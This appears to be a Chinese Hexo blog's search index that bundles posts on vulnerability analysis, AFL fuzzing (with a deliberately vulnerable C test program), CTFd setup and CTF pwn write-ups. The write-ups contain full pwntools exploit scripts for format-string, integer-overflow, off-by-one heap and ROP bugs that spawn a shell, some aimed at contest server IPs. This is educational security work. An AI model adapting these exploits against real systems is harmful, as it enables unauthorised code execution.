<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[软件漏洞分析]]></title>
    <url>%2F2019%2F11%2F17%2F%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[广义漏洞分析：指的是围绕漏洞所进行的所有工作，包括：漏洞挖掘：使用程序分析或软件测试技术发现软件中可能存在的未知的安全漏洞漏洞检测：又称漏洞扫描，基于漏洞特征库，通过扫描等手段对指定的远程或者本地计算机系统的安全脆弱性进行检测，以发现可利用的已知漏洞漏洞应用：借助漏洞堆软件或其依附的目标系统进行模拟攻击，并且对攻击代码进行生存性验证漏洞消除：对漏洞进行修复，包括漏洞防御、补丁修复、安全加固等漏洞管控：包括漏洞收集与发布、漏洞资源的积累与分析、漏洞的准则规范的制定等 狭义漏洞分析：特指漏洞挖掘，包括：架构安全分析：在设计阶段进行软件架构分析，从更高、更抽象的层次保障软件安全性源代码漏洞分析：通常使用静态分析方法，整个过程包括源代码模型构造、漏洞模式提取、基于软件模型和漏洞模式的模式匹配二进制漏洞分析：包括静态分析和动态分析两种运行系统漏洞分析：分析对象是已经实际部署的软件系统，通过信息收集、漏洞检测和漏洞确认三个基本步骤堆软件系统进行漏洞分析]]></content>
      <categories>
        <category>漏洞挖掘</category>
      </categories>
      <tags>
        <tag>漏洞挖掘</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[AFL漏洞挖掘]]></title>
    <url>%2F2019%2F11%2F12%2FAFL%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%2F</url>
    <content type="text"><![CDATA[一 前言模糊测试（Fuzzing）技术作为漏洞挖掘最有效的手段之一，近年来一直是众多安全研究人员发现漏洞的首选技术。AFL、LibFuzzer、honggfuzz等操作简单友好的工具相继出现，也极大地降低了模糊测试的门槛。 二 AFL简介AFL（American Fuzzy Lop）是由安全研究员Michał Zalewski（@lcamtuf）开发的一款基于覆盖引导（Coverage-guided）的模糊测试工具，它通过记录输入样本的代码覆盖率，从而调整输入样本以提高覆盖率，增加发现漏洞的概率。其工作流程大致如下： ①从源码编译程序时进行插桩，以记录代码覆盖率（Code Coverage）； ②选择一些输入文件，作为初始测试集加入输入队列（queue）； ③将队列中的文件按一定的策略进行“突变”； ④如果经过变异文件更新了覆盖范围，则将其保留添加到队列中; ⑤上述过程会一直循环进行，期间触发了crash的文件会被记录下来。 三 选择和评估测试的目标开始Fuzzing前，首先要选择一个目标。 AFL的目标通常是接受外部输入的程序或库，输入一般来自文件（也可以Fuzzing一个网络程序）。 用什么语言编写AFL主要用于C/C++程序的测试，所以这是我们寻找软件的最优先规则。（也有一些基于AFL的JAVA Fuzz程序如kelinci、java-afl等） 是否开源AFL既可以对源码进行编译时插桩，也可以使用AFL的QEMU mode对二进制文件进行插桩，但是前者的效率相对来说要高很多，在Github上很容易就能找到很多合适的项目。 程序版本目标应该是该软件的最新版本，不然辛辛苦苦找到一个漏洞，却发现早就被上报修复了就尴尬了。 是否有示例程序、测试用例如果目标有现成的基本代码示例，特别是一些开源的库，可以方便我们调用该库不用自己再写一个程序；如果目标存在测试用例，那后面构建语料库时也省事儿一点。 项目规模某些程序规模很大，会被分为好几个模块，为了提高Fuzz效率，在Fuzzing前，需要定义Fuzzing部分。这里推荐一下源码阅读工具Understand，它treemap功能，可以直观地看到项目结构和规模。 程序曾出现过漏洞如果某个程序曾曝出过多次漏洞，那么该程序有仍有很大可能存在未被发现的安全漏洞。 四 构建语料库AFL需要一些初始输入数据（也叫种子文件）作为Fuzzing的起点，这些输入甚至可以是毫无意义的数据，AFL可以通过启发式算法自动确定文件格式结构。lcamtuf就在博客中给出了一个有趣的例子——对djpeg进行Fuzzing时，仅用一个字符串”hello”作为输入，最后凭空生成大量jpge图像！ 尽管AFL如此强大，但如果要获得更快的Fuzzing速度，那么就有必要生成一个高质量的语料库，这一节就解决如何选择输入文件、从哪里寻找这些文件、如何精简找到的文件三个问题。 1. 选择(1) 有效的输入 尽管有时候无效输入会产生bug和崩溃，但有效输入可以更快的找到更多执行路径。 (2) 尽量小的体积 较小的文件会不仅可以减少测试和处理的时间，也能节约更多的内存，AFL给出的建议是最好小于1 KB，但其实可以根据自己测试的程序权衡，这在AFL文档的perf_tips.txt中有具体说明。 2. 寻找使用项目自身提供的测试用例 目标程序bug提交页面 使用格式转换器，用从现有的文件格式生成一些不容易找到的文件格式： afl源码的testcases目录下提供了一些测试用例 其他开源的语料库 3. 修剪网上找到的一些大型语料库中往往包含大量的文件，这时就需要对其精简，这个工作有个术语叫做——语料库蒸馏（Corpus Distillation）。AFL提供了两个工具来帮助我们完成这部工作——afl-cmin和afl-tmin。(1) 移除执行相同代码的输入文件——afl-cmin afl-cmin的核心思想是：尝试找到与语料库全集具有相同覆盖范围的最小子集。举个例子：假设有多个文件，都覆盖了相同的代码，那么就丢掉多余的文件。其使用方法如下：1$ afl-cmin -i input_dir -o output_dir -- /path/to/tested/program [params] 更多的时候，我们需要从文件中获取输入，这时可以使用“@@”代替被测试程序命令行中输入文件名的位置。Fuzzer会将其替换为实际执行的文件：1$ afl-cmin -i input_dir -o output_dir -- /path/to/tested/program [params] @@ (2) 减小单个输入文件的大小——afl-tmin整体的大小得到了改善，接下来还要对每个文件进行更细化的处理。afl-tmin缩减文件体积的原理这里就不深究了，有机会会在后面文章中解释，这里只给出使用方法（其实也很简单，有兴趣的朋友可以自己搜一搜）。 afl-tmin有两种工作模式，instrumented mode和crash mode。默认的工作方式是instrumented mode1$ afl-tmin -i input_file -o output_file -- /path/to/tested/program [params] @@ 如果指定了参数-x，即crash mode，会把导致程序非正常退出的文件直接剔除。 1$ afl-tmin -x -i input_file -o output_file -- /path/to/tested/program [params] @@ afl-tmin接受单个文件输入，所以可以用一条简单的shell脚本批量处理。如果语料库中文件数量特别多，且体积特别大的情况下，这个过程可能花费几天甚至更长的时间！ 1for i in *; do afl-tmin -i $i -o tmin-$i -- ~/path/to/tested/program [params] @@; done;s 五 构建被测试程序前面说到，AFL从源码编译程序时进行插桩，以记录代码覆盖率。这个工作需要使用其提供的两种编译器的wrapper编译目标程序，和普通的编译过程没有太大区别 1. afl-gcc模式afl-gcc/afl-g++作为gcc/g++的wrapper，它们的用法完全一样，前者会将接收到的参数传递给后者，我们编译程序时只需要将编译器设置为afl-gcc/afl-g++就行，如下面演示的那样。如果程序不是用autoconf构建，直接修改Makefile文件中的编译器为afl-gcc/g++也行。 1$ ./configure CC="afl-gcc" CXX="afl-g++" 在Fuzzing共享库时，可能需要编写一个简单demo，将输入传递给要Fuzzing的库（其实大多数项目中都自带了类似的demo）。这种情况下，可以通过设置LD_LIBRARY_PATH让程序加载经过AFL插桩的.so文件，不过最简单的方法是静态构建，通过以下方式实现： 1$ ./configure --disable-shared CC="afl-gcc" CXX="afl-g++" 2. LLVM模式LLVM Mode模式编译程序可以获得更快的Fuzzing速度，进入llvm_mode目录进行编译，之后使用afl-clang-fast构建序程序即可，如下所示： 1$ cd llvm_mode$ apt-get install clang$ export LLVM_CONFIG=`which llvm-config` &amp;&amp; make &amp;&amp; cd ..$ ./configure --disable-shared CC="afl-clang-fast" CXX="afl-clang-fast++" 在使用高版本的clang编译时可能会报错，换成clang-3.9后通过编译，如果你的系统默认安装的clang版本过高，可以安装多个版本然后使用update-alternatives切换。 六 开始Fuzzing1. 白盒测试(1) 测试插桩程序编译好程序后，可以选择使用afl-showmap跟踪单个输入的执行路径，并打印程序执行的输出、捕获的元组（tuples），tuple用于获取分支信息，从而衡量衡量程序覆盖情况，下一篇文章中会详细的解释，这里可以先不用管。 1$ afl-showmap -m none -o /dev/null -- ./build/bin/imagew 23.bmp out.png[*] Executing './build/bin/imagew'...-- Program output begins --23.bmp -&gt; out.pngProcessing: 13x32-- Program output ends --[+] Captured 1012 tuples in '/dev/null'. 使用不同的输入，正常情况下afl-showmap会捕获到不同的tuples，这就说明我们的的插桩是有效的，还有前面提到的afl-cmin就是通过这个工具来去掉重复的输入文件。 (2) 执行fuzzer在执行afl-fuzz前，如果系统配置为将核心转储文件（core）通知发送到外部程序。 将导致将崩溃信息发送到Fuzzer之间的延迟增大，进而可能将崩溃被误报为超时，所以我们得临时修改core_pattern文件，如下所示： 1echo core &gt;/proc/sys/kernel/core_pattern 之后就可以执行afl-fuzz了，通常的格式是： 1$ afl-fuzz -i testcase_dir -o findings_dir /path/to/program [params] 或者使用“@@”替换输入文件，Fuzzer会将其替换为实际执行的文件： 1$ afl-fuzz -i testcase_dir -o findings_dir /path/to/program @@ 如果没有什么错误，Fuzzer就正式开始工作了。首先，对输入队列中的文件进行预处理；然后给出对使用的语料库可警告信息，比如下图中提示有个较大的文件（14.1KB），且输入文件过多；最后，开始Fuzz主循环，显示状态窗口。 测试源代码:1234567891011121314151617181920212223242526272829303132333435#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;string.h&gt; #include &lt;signal.h&gt; int vuln(char *str)&#123; int len = strlen(str); if(str[0] == 'A' &amp;&amp; len == 66) &#123; raise(SIGSEGV); //如果输入的字符串的首字符为A并且长度为66，则异常退出 &#125; else if(str[0] == 'F' &amp;&amp; len == 6) &#123; raise(SIGSEGV); //如果输入的字符串的首字符为F并且长度为6，则异常退出 &#125; else &#123; printf("it is good!\n"); &#125; return 0;&#125;int main(int argc, char *argv[])&#123; char buf[100]=&#123;0&#125;; gets(buf);//存在栈溢出漏洞 printf(buf);//存在格式化字符串漏洞 vuln(buf); return 0;&#125; AFL状态窗口 ① Process timing:Fuzzer运行时长、以及距离最近发现的路径、崩溃和挂起经过了多长时间。 ② Overall results：Fuzzer当前状态的概述。 ③ Cycle progress：我们输入队列的距离。 ④ Map coverage：目标二进制文件中的插桩代码所观察到覆盖范围的细节。 ⑤ Stage progress：Fuzzer现在正在执行的文件变异策略、执行次数和执行速度。 ⑥ Findings in depth：有关我们找到的执行路径，异常和挂起数量的信息。 ⑦ Fuzzing strategy yields：关于突变策略产生的最新行为和结果的详细信息。 ⑧ Path geometry：有关Fuzzer找到的执行路径的信息。 ⑨ CPU load：CPU利用率 (3) 使用screen一次Fuzzing过程通常会持续很长时间，如果这期间运行afl-fuzz实例的终端终端被意外关闭了，那么Fuzzing也会被中断。而通过在screen session中启动每个实例，可以方便的连接和断开。1$ screen afl-fuzz -i testcase_dir -o findings_dir /path/to/program @@ 也可以为每个session命名，方便重新连接。1$ screen -S fuzzer1$ afl-fuzz -i testcase_dir -o findings_dir /path/to/program [params] @@[detached from 6999.fuzzer1]$ screen -r fuzzer1 ... 2. 黑盒测试所谓黑盒测试，通俗地讲就是对没有源代码的程序进行测试，这时就要用到AFL的QEMU模式了。启用方式和LLVM模式类似，也要先编译。但注意，因为AFL使用的QEMU版本太旧，util/memfd.c中定义的函数memfd_create()会和glibc中的同名函数冲突，在这里可以找到针对QEMU的patch，之后运行脚本build_qemu_support.sh就可以自动下载编译。 12$ sudo apt-get install libini-config-dev libtool-bin automake bison libglib2.0-dev -y$ $ cd qemu_mode$ build_qemu_support.sh$ cd .. &amp;&amp; make install 现在起，只需添加-Q选项即可使用QEMU模式进行Fuzzing。1$ afl-fuzz -Q -i testcase_dir -o findings_dir /path/to/program [params] @@ 七 结束测试1.何时结束检查afl-fuzz工作状态的目的是为何时停止测试提供依据，通常来说符合下面几种情况时就可以停掉了。 （1）状态窗口中”cycles done”字段颜色变为绿色该字段的颜色可以作为何时停止测试的参考，随着周期数不断增大，其颜色也会由洋红色，逐步变为黄色、蓝色、绿色。当其变为绿色时，继续Fuzzing下去也很难有新的发现了，这时便可以通过Ctrl-C停止afl-fuzz。 （2）距上一次发现新路径（或者崩溃）已经过去很长时间了，至于具体多少时间还是需要自己把握，比如长达一个星期或者更久估计大家也都没啥耐心了吧。 （3）目标程序的代码几乎被测试用例完全覆盖，这种情况好像很少见，但是对于某些小型程序应该还是可能的，至于如何计算覆盖率将在下面介绍。 （4）上面提到的pythia提供的各种数据中，一旦path covera达到99％（通常来说不太可能），如果不期望再跑出更多crash的话就可以中止fuzz了，因为很多crash可能是因为相同的原因导致的；还有一点就是correctness的值达到1e-08，根据pythia开发者的说法，这时从上次发现path/uniq crash到下一次发现之间大约需要1亿次执行，这一点也可以作为衡量依据。 2. 输出结果afl-fuzz的输出目录中存在很多文件，有时想要写一个辅助工具可能就要用到其中的文件。下面以多个fuzz实例并行测试时的同步目录为例： queue：存放所有具有独特执行路径的测试用例。 crashes：导致目标接收致命signal而崩溃的独特测试用例。 crashes/README.txt：保存了目标执行这些crash文件的命令行参数。 hangs：导致目标超时的独特测试用例。 fuzzer_stats：afl-fuzz的运行状态。 plot_data：用于afl-plot绘图。 八 处理测试结果到了这里，我们可能已经跑出了一大堆的crashes，那么接下来的步骤，自然是确定造成这些crashes的bug是否可以利用，怎么利用？这是另一个重要方面。当然，个人觉得这比前面提到的内容都要困难得多，这需要对常见的二进制漏洞类型、操作系统的安全机制、代码审计和调试等内容都有一定深度的了解。]]></content>
      <categories>
        <category>漏洞挖掘</category>
      </categories>
      <tags>
        <tag>漏洞挖掘</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[360杯 pwn writeup]]></title>
    <url>%2F2019%2F11%2F01%2F360%E6%9D%AF-pwn-writeup%2F</url>
    <content type="text"><![CDATA[pwn1格式化字符串漏洞，但跟平时做的还不太一样，这题输入的数据存到了bss段，任意地址写的时候，不能像平时那样直接写到栈上，解析栈上的数据，这里需要找一个合适的跳板，来修改函数返回地址。当时没有做出来，看了360官方writeup之后，觉得利用的过程很巧妙，学到了一些新的姿势，对栈上的数据又有了更深刻的认识。 解题思路 泄露libc_addr,stack_addr 突破输入次数的限制，修改i的值 在跳板写上ret_addr所在的栈地址，再修改ret_addr为onegadget exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109from pwn import *context.log_level = 'debug'p = process('./pwn1')gadgets = [0x3a80c,0x3ac5e,0x3a812,0x3a819,0x5f065,0x5f066]def HL(value): lis = [] high = value &gt;&gt; 16 low = value &amp; 0xffff lis.append(low) lis.append(high) return lis def input(payload): p.recvuntil("2. Exit") p.send('1') p.recvuntil("something") p.sendline(payload) def exit(): p.recvuntil("2. Exit") p.send('2') ## leak addressinput("%5$p%12$p%15$p")p.recvline()leaked = p.recvline()bin_base = int(leaked[2:10], 16) - 0x1fb8stack_addr = int(leaked[12:20], 16)var_addr = stack_addr - 0x2C + 0x3target_addr = stack_addr - 0x4libc_base = int(leaked[22:30],16) - 247 - 0x18540shell_addr = libc_base + gadgets[1]bp = bin_base + 0x81c#gdb.attach(p,'b *' + str(hex(bp)))log.info("binary_base address is %x" % bin_base)log.info("stack address is %x" % stack_addr)log.info("libc_base address is %x" % libc_base)log.info("var address is %x" % var_addr)log.info("target address is %x" % target_addr)## Modify var i valueslis = HL(var_addr)print lispause()input("%" + str(lis[0]) + "c%21$hn")input("%255d%57$hhn")## Write one_gadget at ret_addr through the target_addrlis = HL(target_addr)input("%" + str(lis[0]) + "c%21$hn")lis = HL(target_addr+2)input("%" + str(lis[0]) + "d%22$hn")lis = HL(shell_addr)input("%" + str(lis[0]) + "c%57$hn")input("%" + str(lis[1]) + "c%59$hn")exit()p.interactive() pwn2整数溢出，需要注意的是数值在比较的时候是用本身的数据，而做运算（如加减）的时候，用的是自身的补码。此题输入的字符数中不让有”-“符号。 解题思路 pass1绕过: x1和y1都是有符号整数，令x1为359，y1为0xffffffff就可以绕过判断 pass2绕过: 利用整数溢出里面的回绕，int类型大小为4个字节，最大存的数为0x00000000ffffffff,若两数相乘为0x0000000100000168 ，产出溢出结果等于0x168 exp1234567891011121314151617181920212223242526from pwn import *#context.log_level = 'debug' p = process("./pwn2")if __name__=='__main__': p.recvuntil("x:") p.sendline(str(359)) p.recvuntil("y:") p.sendline(str(2**32-1)) p.recvuntil("Please input x and y:") #gdb.attach(p) p.sendline(str(8)+" "+str(0x0000000100000168/8)) p.interactive()]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019 RoarCTF pwn writeup]]></title>
    <url>%2F2019%2F10%2F14%2F2019-RoarCTF-pwn-writeup%2F</url>
    <content type="text"><![CDATA[easypwn程序分析off-by-one漏洞,输入content的时候，可控size的大小;第二次输入size - 第一次输入的size = 10 时，可多输入一字节。123456789101112__int64 __fastcall sub_E26(signed int a1, unsigned int a2)&#123; __int64 result; // rax if ( a1 &gt; (signed int)a2 ) return a2; if ( a2 - a1 == 10 ) LODWORD(result) = a1 + 1; else LODWORD(result) = a1; return (unsigned int)result;&#125; 利用思路 利用堆块重叠，修改B的size为B+C的size free B , 再malloc B ，就可以泄露C里面的&lt; main_arena+88 &gt;，再减去距离libc_base的偏移，得到libc_base 再利用堆块重叠，修改E的size为E+F的size free E , malloc E+F大小的size，修复F的size，再free F 把target_addr 写入到F的fd位 malloc F ,就可以malloc target_addr，达到任意地址写 但是这题用的是calloc，不能把 &lt;__malloc_hook &gt;写onegadget;应该把 &lt;_realloc_hook &gt;写入onegadget，再把&lt;_malloc_hook &gt;写入&lt; _realloc_hook &gt;。 &lt;__malloc_hook&gt;在 &lt; main_arena-0x10&gt; &lt;__realloc_hook&gt;在&lt; main_arena-0x18&gt; &lt;__memalign_hook&gt;在&lt; main_arena-0x20&gt; exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869# -*- coding: utf-8 -*-from pwn import *p = process("./easy_pwn")#p = remote("39.97.182.233", 41458)elf = ELF("./easy_pwn")libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')context.log_level = "debug"def create(size): p.sendlineafter("choice: ",str(1)) p.sendlineafter("size: ",str(size))def edit(index,size,content): p.sendlineafter("choice: ",str(2)) p.sendlineafter("index: ",str(index)) p.sendlineafter("size: ",str(size)) p.sendlineafter("content: ",content)def delete(index): p.sendlineafter("choice: ",str(3)) p.sendlineafter("index: ",str(index))def show(index): p.sendlineafter("choice: ",str(4)) p.sendlineafter("index: ",str(index))create(0x68) # 0create(0x68) # 1create(0x68) # 2create(0x68) # 3create(0x68) # 4create(0x68) # 5create(0x68) # 6create(0x68) # 7edit(1,0x68+10,"a"*0x60+p64(0)+"\xe1")#gdb.attach(p)delete(2)create(0x68) # 2show(3)p.recvuntil("content: ")data = u64(p.recv(6).ljust(8,"\x00"))print hex(data)main_arean = data-88libc_base = main_arean - 0x3c4b20system_addr = libc_base + libc.symbols['system']target_addr = data-0x8bone_gadgets=[0x45216,0x4526a,0xf02a4,0xf1147]edit(4,0x68+10,"a"*0x60+p64(0)+"\xe1")delete(5)#gdb.attach(p)create(0xd0) #5edit(5,0xd0,"\x02"*0x68+p64(0x70)+"\x06"*0x60)delete(6)edit(5,0xd0,"\x03"*0x68+p64(0x70)+p64(target_addr)+0x58*"\x00")#gdb.attach(p)create(0x68) # 6create(0x68) # 8print hex(one_gadgets[2]+libc_base)print hex(libc_base+libc.symbols["realloc"]+13)pause()edit(8,0x68,"a"*0xb+p64(one_gadgets[2]+libc_base)+p64(libc_base+libc.symbols["realloc"]+13)+"a"*(0x50-3))#gdb.attach(p)create(0x50)p.interactive() calloc_magic]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTFd 比赛平台的搭建]]></title>
    <url>%2F2019%2F10%2F14%2FCTFd-%E6%AF%94%E8%B5%9B%E5%B9%B3%E5%8F%B0%E7%9A%84%E6%90%AD%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[开源项目地址 https://github.com/CTFd/CTFd 安装建议在docker里面搭建，环境不会冲突。docker安装教程 安装完docker之后，可用以下命令1docker run -p 8000:8000 -it ctfd/ctfd 但是安装的太慢，不用官方的镜像，这里建议用阿里云公开的容器镜像，只用如下两条命令即可。1docker pull registry.cn-hangzhou.aliyuncs.com/capeic_sbw/ctfd:1.0 安装镜像之后起个容器1docker run -p 8000:8000 -it registry.cn-hangzhou.aliyuncs.com/capeic_sbw/ctfd:1.0 测试在物理机访问 0.0.0.0:8000 即可,第一次登陆设置管理员账号密码，下图是已经设置过的 管理重命名镜像1docker tag ctfd:latest registry.cn-hangzhou.aliyuncs.com/capeic_sbw/ctfd:1.0 查看docker进程12345678$docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESd9f5eefb8d62 pwn_deploy_chroot:latest "/service.sh" 6 days ago Exited (255) 5 days ago 0.0.0.0:10000-10003-&gt;10000-10003/tcp pwn_deploy_chroot846ac8b76082 pwn_docker:16.04 "/start.sh" 10 days ago Exited (255) 9 days ago 0.0.0.0:9997-&gt;9999/tcp musing_leakeyfd531742a5a3 ctfd:latest "/opt/CTFd/docker-en…" 11 days ago Up 8 seconds 0.0.0.0:8000-&gt;8000/tcp affectionate_khayyam36aeab92fea7 registry.cn-hangzhou.aliyuncs.com/liujunjie/angr "/bin/sh -c 'su - an…" 12 days ago Exited (255) 2 days ago mystifying_ardinghelli833d79e2e12e ctf "/bin/sh -c 'exec /b…" 4 months ago Exited (130) 4 months ago epic_sutherlanda55693666b02 ctf "/bin/sh -c 'exec /b…" 4 months ago Exited (143) 4 months ago 停止容器进程1docker stop fd53 启动容器进程1docker start fd53 重启容器进程1docker restart fd53]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[OGeekCTF 2019 部分 writeups]]></title>
    <url>%2F2019%2F10%2F11%2FOGeekCTF-2019-%E9%83%A8%E5%88%86-writeups%2F</url>
    <content type="text"><![CDATA[pwnbabyrop题目分析靶机环境是32位的glibc-2.23。123456789101112131415161718int __cdecl check(int random)&#123; size_t v1; // eax char s; // [esp+Ch] [ebp-4Ch] char buf[32]; // [esp+2Ch] [ebp-2Ch] ssize_t v5; // [esp+4Ch] [ebp-Ch] memset(&amp;s, 0, 0x20u); memset(buf, 0, 0x20u); sprintf(&amp;s, "%ld", random); v5 = read(0, buf, 0x20u); buf[v5 - 1] = 0; v1 = strlen(buf); if ( strncmp(buf, &amp;s, v1) ) exit(0); write(1, "Correct\n", 8u); return (unsigned __int8)buf[7];&#125; 程序难点在于我们输入的buf要与随机生成的random前v1个字节要相等我们可以直接输入\0开头的字符串来进行绕过，然后strlen的长度就为0，则后面的strncmp判断必定成功 123456789void __cdecl vul(char a1)&#123; char buf[231]; // [esp+11h] [ebp-E7h] if ( a1 == 127 ) read(0, buf, 200u); else read(0, buf, a1);&#125; 之后的漏洞函数中，a1是我们之前输入的第八个字符，如果我们输入\xff时；则在read时a1会进行符号填充，那么我们就可以读入4294967295（-1）个字节，这将直接导致栈溢出，之后就行常规的ROP exp脚本用了两种不同的ROP123456789101112131415161718192021222324252627from pwn import *execve_file = './babyrop'#sh = process(execve_file)sh = remote('47.112.137.238', 13337)elf = ELF(execve_file)libc = ELF('./libc-2.23.so')#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')sh.sendline('\0' + '\xff' * 10)sh.recvuntil('Correct\n')sh.sendline('a'*231+'b'*4+p32(elf.plt['write'])+p32(0x080487D0)+p32(1)+p32(elf.got['puts'])+p32(4))result=sh.recv(4)libc.address = u32(result) - libc.symbols['puts']log.success('libc_addr: ' + hex(libc.address))sh.send('a'*231+'b'*4+p32(libc.symbols['system'])+p32(0)+p32(libc.search('/bin/sh').next()))sh.interactive()'''sh.send('a' * 231 + p32(0x804b000 - 0x800) + p32(elf.plt['puts']) + p32(0x08048519) + p32(elf.got['puts']) + p32(elf.plt['read']) + p32(0x08048608) + p32(0) + p32(0x804b000 - 0x800) + p32(0x200))result = sh.recvuntil('\n')[:-1]libc_addr = u32(result) - libc.symbols['puts']log.success('libc_addr: ' + hex(libc_addr))sh.send(p32(0) + p32(libc_addr + libc.symbols['system']) + p32(libc_addr + libc.symbols['exit']) + p32(libc_addr + libc.search('/bin/sh').next()))sh.interactive()''' book manager题目分析靶机环境是glibc-2.23,在Add_text功能中，size的大小是由用户决定的，而在Update功能中，其输入的大小指定为255，导致堆溢出漏洞1234567891011121314v6 = get_int();if ( v6 &lt;= 256 )&#123; v2 = *(_QWORD *)(*(_QWORD *)(a1 + 8 * (v4 + 4LL)) + 8 * (i + 4LL)); *(_QWORD *)(v2 + 32) = malloc(v6); printf("\nText:"); read_n(&amp;s, 0x100u); v3 = strlen(&amp;s); memcpy(*(void **)(*(_QWORD *)(*(_QWORD *)(a1 + 8 * (v4 + 4LL)) + 8 * (i + 4LL)) + 32LL), &amp;s, v3);&#125;else&#123; printf("\nToo many");&#125; 1234printf("\nNew Text:");read_n(*(void **)(*(_QWORD *)(*(_QWORD *)(a1 + 8 * (v5 + 4LL)) + 8 * (v6 + 4LL)) + 32LL), 255u);printf("\nUpdated", 255LL);return; 思路 由于Text结构的输入没有null截断，我们可以直接泄露libc地址 劫持Text结构体，实现任意地址读写，我们只需要提前布置好heap 结构就行 劫持hook,getshell exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#!/usr/bin/python2# -*- coding:utf-8 -*-from pwn import *context.arch = 'amd64'# context.arch = 'i386'# context.log_level = 'debug'execve_file = './bookmanager'sh = process(execve_file)#sh = remote('47.112.115.30', 13337)elf = ELF(execve_file)# libc = ELF('./libc-2.23.so')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def Add_chapter(c_name): sh.sendlineafter('Your choice:', '1') sh.sendafter('Chapter name:', c_name)def Add_section(c_name, s_name): sh.sendlineafter('Your choice:', '2') sh.sendafter('Which chapter do you want to add into:', c_name) sh.sendafter('Section name:', s_name)def Add_text(s_name, size, text): sh.sendlineafter('Your choice:', '3') sh.sendafter('Which section do you want to add into:', s_name) sh.sendlineafter('How many chapters you want to write:', str(size)) sh.sendafter('Text:', text)def Remove_text(s_name): sh.sendlineafter('Your choice:', '6') sh.sendafter('Section name:', s_name)def Book_preview(): sh.sendlineafter('Your choice:', '7')def Update(s_name, text): sh.sendlineafter('Your choice:', '8') sh.sendlineafter('hat to update?(Chapter/Section/Text):', 'Text') sh.sendafter('Section name:', s_name) sh.sendafter('New Text:', text)sh.recvuntil('Name of the book you want to create: ')sh.send('a' * 30)gdb.attach(sh)Add_chapter('aaaa\n')Add_section('aaaa\n', 'bbbb\n')Add_section('aaaa\n', 'cccc\n')Add_text('bbbb\n', 0x88, '\n')Add_text('cccc\n', 0x68, 'here\n')Remove_text('bbbb\n')Add_text('bbbb\n', 0x88, '\x78')Book_preview()sh.recvuntil('Section:bbbb')sh.recvuntil('Text:')result = sh.recvline()[:-1]main_arena_addr = u64(result.ljust(8, '\0')) - 88log.success('main_arena_addr: ' + hex(main_arena_addr))libc_addr = main_arena_addr - (libc.symbols['__malloc_hook'] + 0x10)log.success('libc_addr: ' + hex(libc_addr))Add_section('aaaa\n', 'dddd\n')Update('cccc\n', '/bin/sh\0'.ljust(0x60, '\0') + p64(0) + p64(0x41) + 'dddd'.ljust(0x20, '\0') + p64(libc_addr + libc.symbols['__free_hook']))Update('dddd\n', p64(libc_addr + libc.symbols['system']))Remove_text('cccc\n')sh.interactive()clear() hub]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一段有趣的c语言代码]]></title>
    <url>%2F2019%2F10%2F10%2F%E4%B8%80%E6%AE%B5%E6%9C%89%E8%B6%A3%E7%9A%84c%E8%AF%AD%E8%A8%80%E4%BB%A3%E7%A0%81%2F</url>
    <content type="text"><![CDATA[今天看到一段有趣的c代码，如下:12345678910111213#include &lt;stdio.h&gt;void function(int a,int b,int c)&#123; int *ret; ret=&amp;a-1; (*ret)+=8;&#125;void main()&#123; int x; x=0; function(1,2,3); x=1; printf("x is %d\n",x);&#125; 群里的人讨论最终输出x的值是0还是1呐? 经过我的测试，编译成32位的程序x是0,而64位的是1123456$ gcc text.c -o text_64$ gcc text.c -o text_32 -m32$ ./text_32 x is 0$ ./text_64 x is 1 这是为什么呐?我决定用gdb调一下，先调一下32位的程序12345678910111213141516171819202122232425262728293031323334353637383940410x08048445 in main ()LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA───────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────────────────────────────────────────── EAX 0xf7f90dbc (environ) —▸ 0xffffcd1c —▸ 0xffffcf56 ◂— 'XDG_VTNR=7' EBX 0x0 ECX 0xffffcc80 ◂— 0x1 EDX 0xffffcca4 ◂— 0x0 EDI 0xf7f8f000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0 ESI 0xf7f8f000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0 EBP 0xffffcc68 ◂— 0x0 ESP 0xffffcc44 ◂— 0x1 EIP 0x8048445 (main+30) —▸ 0xffffc1e8 ◂— 0x0─────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────────────────────────────── 0x8048435 &lt;main+14&gt; sub esp, 0x14 0x8048438 &lt;main+17&gt; mov dword ptr [ebp - 0xc], 0 0x804843f &lt;main+24&gt; push 3 0x8048441 &lt;main+26&gt; push 2 0x8048443 &lt;main+28&gt; push 1 ► 0x8048445 &lt;main+30&gt; call function &lt;0x804840b&gt; arg0: 0x1 0x804844a &lt;main+35&gt; add esp, 0xc 0x804844d &lt;main+38&gt; mov dword ptr [ebp - 0xc], 1 0x8048454 &lt;main+45&gt; sub esp, 8 0x8048457 &lt;main+48&gt; push dword ptr [ebp - 0xc] 0x804845a &lt;main+51&gt; 